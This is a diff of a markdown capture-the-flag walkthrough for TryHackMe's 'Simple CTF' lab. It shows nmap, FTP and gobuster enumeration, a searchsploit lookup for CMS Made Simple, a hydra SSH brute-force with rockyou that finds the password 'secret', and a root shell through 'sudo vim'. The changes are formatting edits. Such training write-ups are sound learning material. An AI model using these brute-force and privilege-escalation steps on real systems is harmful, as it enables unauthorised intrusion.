@@ -5,12 +5,15 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Linux
 Subscription type: Free
 Description: Beginner level ctf
 ```
+
 Room link: [https://tryhackme.com/r/room/easyctf](https://tryhackme.com/r/room/easyctf)
 
 ## Solution
@@ -18,6 +21,7 @@ Room link: [https://tryhackme.com/r/room/easyctf](https://tryhackme.com/r/room/e
 ### Check for services with nmap
 
 We start by scanning the machine with `nmap` on all ports
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
 └─$ nmap -v -sV -sC -p- 10.10.167.216  
@@ -99,7 +103,9 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 149.41 seconds
 ```
+
 We have three services running:
+
 - vsftpd v3.0.3 on port 21
 - Apache httpd v2.4.18 on port 80
 - OpenSSH v7.2p2 on port 2222
@@ -109,6 +115,7 @@ Browsing manually to port 80 shows an `Apache2 Ubuntu Default Page`.
 ### Check for files on the FTP-server
 
 Let's start by checking out the FTP-server
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
 └─$ ftp 10.10.167.216  
@@ -151,11 +158,13 @@ ftp> quit
 └─$ cat ForMitch.txt 
 Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
 ```
+
 Ah, we have a user (`Mitch`) with a weak password.
 
 ### Scan for web content with gobuster
 
 Next, let's try to identify common directories with `gobuster`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
 └─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.167.216    
@@ -185,6 +194,7 @@ Finished
 Checking the web page (`http://10.10.167.216/simple/`) we can see that it is running `CMS Made Simple version v2.2.8`.
 
 We ought to check if there are any know vulnerabilities for this version
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
 └─$ searchsploit CMS Made Simple              
@@ -244,6 +254,7 @@ Copied to: /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Simple_CTF/46635.py
 ### Brute-force the password for Mitch
 
 We can try to brute-force the password for user `mitch` with `hydra`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
 └─$ hydra -P /usr/share/wordlists/rockyou.txt -l mitch -s 2222 ssh://10.10.167.216
@@ -260,11 +271,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-23 20:02:
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-23 20:03:06
 ```
+
 The password is `secret`.
 
 ### Get the user flag
 
 Now we can login a mitch via ssh and get the user flag
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Simple_CTF]
 └─$ ssh -p 2222 mitch@10.10.167.216
@@ -292,6 +305,7 @@ $
 ```
 
 We can also check what other users are present on the system
+
 ```bash
 $ ls -l /home
 total 8
@@ -303,16 +317,19 @@ $
 ### Privilege escalation
 
 Let's start our enumeration by checking if we can run commands as root with `sudo -l`
+
 ```bash
 $ sudo -l
 User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
 ```
+
 Yes, we can run `vim` as root without a password!
 
 ### Get the root flag
 
 We can use this trick from [GTFOBins](https://gtfobins.github.io/gtfobins/vim/) to get a shell via `vim` and then get the root flag
+
 ```bash
 $ sudo vim -c ':!/bin/sh'
 
@@ -322,17 +339,18 @@ uid=0(root) gid=0(root) groups=0(root)
 W<REDACTED>!
 # 
 ```
+
 Nice!
 
 For additional information, please see the references below.
 
 ## References
 
+- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
 - [Gobuster - Github](https://github.com/OJ/gobuster/)
 - [GTFOBins - vim](https://gtfobins.github.io/gtfobins/vim/)
 - [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
+- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
 - [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
 - [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra)
 - [vim - Linux manual page](https://linux.die.net/man/1/vi)
-- [Wikipedia - Apache HTTP Server](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
-- [Wikipedia - OpenSSH](https://en.wikipedia.org/wiki/OpenSSH)
